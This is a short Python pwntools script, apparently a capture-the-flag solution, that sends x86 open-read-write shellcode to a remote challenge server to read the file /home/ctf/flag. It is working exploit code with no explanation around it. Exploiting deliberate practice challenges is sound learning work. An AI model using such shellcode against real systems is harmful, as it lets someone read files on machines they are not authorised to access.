from pwn import *
p = remote('bamboofox.cs.nctu.edu.tw', 11100)

p.recvuntil(': ')
shellcode = asm(
"""
    jmp str
orw:
    xor ecx,ecx
    pop ebx
    mov eax,5
    int 0x80

    mov edx,0x20
    mov ecx,esp
    mov ebx,eax
    mov eax,3
    int 0x80

    mov edx,eax
    mov ecx,esp
    mov ebx,1
    mov eax,4
    int 0x80

str:
    call orw
    .ascii "/home/ctf/flag"
    .byte 0
"""
)

print shellcode
p.sendline(shellcode)
p.interactive()
